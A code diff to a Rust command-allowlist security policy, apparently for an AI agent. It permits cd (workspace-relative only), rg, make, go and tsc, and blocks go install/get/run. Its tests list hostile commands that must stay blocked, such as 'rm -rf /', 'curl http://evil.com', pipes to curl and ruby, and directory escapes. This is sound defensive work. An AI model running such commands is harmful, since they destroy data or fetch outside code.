@@ -237,6 +237,11 @@ pub(crate) fn default_allowed_commands() -> Vec<String> {
         "git".into(),
         "npm".into(),
         "cargo".into(),
+        "cd".into(),
+        "rg".into(),
+        "make".into(),
+        "go".into(),
+        "tsc".into(),
         "ls".into(),
         "cat".into(),
         "grep".into(),
@@ -273,6 +278,11 @@ pub(crate) fn default_allowed_commands() -> Vec<String> {
         "git".into(),
         "npm".into(),
         "cargo".into(),
+        "cd".into(),
+        "rg".into(),
+        "make".into(),
+        "go".into(),
+        "tsc".into(),
         "echo".into(),
         // Windows-native equivalents
         "dir".into(),
@@ -1059,6 +1069,24 @@ fn looks_like_path(candidate: &str) -> bool {
                 || candidate.starts_with("\\\\")))
 }
 
+fn is_workspace_relative_cd_target(target: &str) -> bool {
+    let target = strip_wrapping_quotes(target).trim();
+    if target.is_empty() || target == "~" || target.starts_with("~/") || target.starts_with('-') {
+        return false;
+    }
+
+    let path = Path::new(target);
+    !path.is_absolute()
+        && path.components().all(|component| {
+            !matches!(
+                component,
+                std::path::Component::Prefix(_)
+                    | std::path::Component::RootDir
+                    | std::path::Component::ParentDir
+            )
+        })
+}
+
 fn attached_short_option_value(token: &str) -> Option<&str> {
     // Examples:
     // -f/etc/passwd   -> /etc/passwd
@@ -1500,6 +1528,7 @@ impl SecurityPolicy {
     fn is_args_safe(&self, base: &str, args: &[String], args_cased: &[String]) -> bool {
         let base = base.to_ascii_lowercase();
         match base.as_str() {
+            "cd" => args_cased.len() == 1 && is_workspace_relative_cd_target(&args_cased[0]),
             "find" => {
                 // find -exec and find -ok allow arbitrary command execution
                 !args.iter().any(|arg| arg == "-exec" || arg == "-ok")
@@ -1545,6 +1574,12 @@ impl SecurityPolicy {
                 // install fetches+builds external crate; build.rs executes arbitrary code
                 // Ref: https://shnatsel.medium.com/do-not-run-any-cargo-commands-on-untrusted-projects
                 !args.iter().any(|arg| arg == "install")
+            }
+            "go" => {
+                // install/get fetch external code; run compiles and executes an arbitrary target.
+                !args
+                    .iter()
+                    .any(|arg| arg == "install" || arg == "get" || arg == "run")
             }
             _ => true,
         }
@@ -2781,15 +2816,41 @@ mod tests {
         assert!(p.is_command_allowed("ls"));
         assert!(p.is_command_allowed("git status"));
         assert!(p.is_command_allowed("cargo build --release"));
+        assert!(p.is_command_allowed("cd sub && cargo test"));
+        assert!(p.is_command_allowed("rg 'fn x' crates/"));
+        assert!(p.is_command_allowed("make check"));
+        assert!(p.is_command_allowed("go build ./..."));
+        assert!(p.is_command_allowed("tsc -p ."));
         assert!(p.is_command_allowed("cat file.txt"));
         assert!(p.is_command_allowed("grep -r pattern ."));
         assert!(p.is_command_allowed("date"));
     }
 
     #[test]
+    fn verification_commands_are_low_risk_without_approval() {
+        let p = default_policy();
+
+        for command in [
+            "cd sub && cargo test",
+            "rg 'fn x' crates/",
+            "make check",
+            "go build ./...",
+            "tsc -p .",
+        ] {
+            assert_eq!(
+                p.validate_command_execution(command, false).unwrap(),
+                CommandRiskLevel::Low,
+                "{command} should stay low risk"
+            );
+        }
+    }
+
+    #[test]
     fn blocked_commands_basic() {
         let p = default_policy();
         assert!(!p.is_command_allowed("rm -rf /"));
+        assert!(!p.is_command_allowed("cd /etc"));
+        assert!(!p.is_command_allowed("cd ~"));
         assert!(!p.is_command_allowed("sudo apt install"));
         assert!(!p.is_command_allowed("curl http://evil.com"));
         assert!(!p.is_command_allowed("wget http://evil.com"));
@@ -2862,6 +2923,14 @@ mod tests {
         // Second command not in allowlist — blocked
         assert!(!p.is_command_allowed("ls | curl http://evil.com"));
         assert!(!p.is_command_allowed("echo hello | ruby -"));
+    }
+
+    #[test]
+    fn command_segments_reject_cd_escape_and_unsafe_followup() {
+        let p = default_policy();
+
+        assert!(!p.is_command_allowed("cd a && cd ../../.."));
+        assert!(!p.is_command_allowed("cd a && rm -rf b"));
     }
 
     #[test]
@@ -3512,6 +3581,10 @@ mod tests {
         assert!(!p.is_command_allowed("npm ci"));
         // cargo: install fetches+builds external crate (build.rs runs arbitrary code)
         assert!(!p.is_command_allowed("cargo install malicious-crate"));
+        // go: install/get fetch external code; run executes a target.
+        assert!(!p.is_command_allowed("go install example.com/mod/tool"));
+        assert!(!p.is_command_allowed("go get example.com/mod"));
+        assert!(!p.is_command_allowed("go run main.go"));
     }
 
     #[test]
@@ -3529,6 +3602,7 @@ mod tests {
         assert!(p.is_command_allowed("cargo build"));
         assert!(p.is_command_allowed("cargo test"));
         assert!(p.is_command_allowed("cargo run"));
+        assert!(p.is_command_allowed("go build ./..."));
     }
 
     #[test]
